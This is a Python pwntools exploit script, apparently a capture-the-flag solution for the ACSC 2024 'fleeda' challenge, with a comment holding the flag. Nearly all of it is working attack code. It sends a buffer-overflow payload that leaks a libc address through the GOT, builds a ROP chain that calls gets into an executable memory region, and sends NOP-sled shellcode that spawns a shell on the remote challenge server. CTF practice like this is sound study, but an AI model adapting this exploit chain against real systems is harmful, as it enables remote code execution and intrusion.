#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './prog'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'fleeda.chal.2024.ctf.acsc.asia', 'port':8109})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)
addr_main           = binf.sep_function['main']
addr_got_main       = binf.got['__libc_start_main']
# addr_bss            = binf.sep_section['.bss']
addr_rwx            = 0x406000

libc = ELF(env.libc) if env.libc else binf.libc
ofs_libc_main           = libc.sep_function['__libc_start_main']

#==========

def attack(conn, **kwargs):
    if env.check('remote'):
        print(conn.recvuntil('\n> ', drop=True))
        conn.send(input('> ').encode())
        conn.recvuntil('POW passed\n')
        sleep(1)

    exploit  = b'a'*0xe + b'!\x00'
    exploit += flat(addr_got_main, addr_main+0x23)
    exploit += b'b'*0x10
    exploit += flat(0xdeadbeef, addr_main)
    conn.sendline(exploit)

    conn.recvuntil(b'a!\n')
    addr_libc_main = u(conn.recvline(keepends=False))
    libc.address = addr_libc_main - ofs_libc_main
    info('addr_libc_base    = 0x{:012x}'.format(libc.address))

    shellasm = shellcraft.sh()
    shellcode = b'\x90'*0x40+asm(shellasm)

    '''
    context(arch='x86', bits=32)
    shellasm  = 'mov esp, {}\n'.format(addr_bss+0xf00)
    # shellasm += shellcraft.sh()
    shellasm += shellcraft.exit(0)
    shellcode = open('to32.bin', 'rb').read()
    shellcode += asm(shellasm)

    context(arch='amd64', bits=64)
    '''

    rop = ROP(libc)
    rop.gets(addr_rwx)
    # rop.call(addr_rwx)

    exploit  = b'c'*0x17 + b'!'
    exploit += bytes(rop)
    conn.sendline(exploit)

    conn.recvuntil(b'c!')
    conn.sendlineafter(b'\n', shellcode)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # ACSC{fl333333_0u7_0f_c0n7r01_e82616e00791}

if __name__=='__main__':
    main()

#==========
